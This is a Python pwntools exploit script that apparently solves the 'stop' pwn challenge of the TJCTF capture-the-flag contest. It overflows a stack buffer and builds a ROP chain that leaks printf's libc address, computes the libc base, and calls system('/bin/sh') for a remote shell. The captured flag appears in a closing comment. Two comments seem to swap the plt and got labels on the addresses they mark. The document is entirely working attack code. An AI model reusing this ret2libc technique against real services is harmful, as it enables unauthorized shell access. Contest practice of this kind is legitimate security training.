#!/usr/bin/env python3
from pwn import *

if False:
    io = process(['./stop'])
    gdb.attach(io, gdbscript='''
b *0x4008d1
c
''')
else:
    io = remote('p1.tjctf.org', 8001)


def send_rop(io, rop):
    io.recvuntil('Which letter? ')
    io.sendline('A')
    io.recvuntil('Category? ')
    io.send(rop)
    io.recvuntil(b'Sorry, we don\'t have that category yet\n')


send_rop(io, flat({
    0x118: b''.join((
        struct.pack('<Q', 0x400954),  # ret - align stack
        struct.pack('<QQ', 0x400953, 0x601fe0),  # pop rdi; ret, printf@plt
        struct.pack('<Q', 0x4005a0),  # printf@got
        struct.pack('<Q', 0x400954),  # ret - align stack
        struct.pack('<Q', 0x40073c),  # main
    )),
}))
printf, = struct.unpack('<Q', io.recv(6) + b'\x00\x00')
print(f'printf=0x{printf:016x}')
libc = printf - 0x64e80
print(f'libc=0x{libc:016x}')
assert libc & 0xfff == 0
send_rop(io, flat({
    0x118: b''.join((
        struct.pack('<Q', 0x400954),  # ret - align stack
        struct.pack('<QQ', 0x400953, 0x400a1a),  # pop rdi; ret, "/bin/sh"
        struct.pack('<Q', libc + 0x4f440),  # system
    )),
}))
io.interactive()
# tjctf{st0p_th4t_r1ght_now}
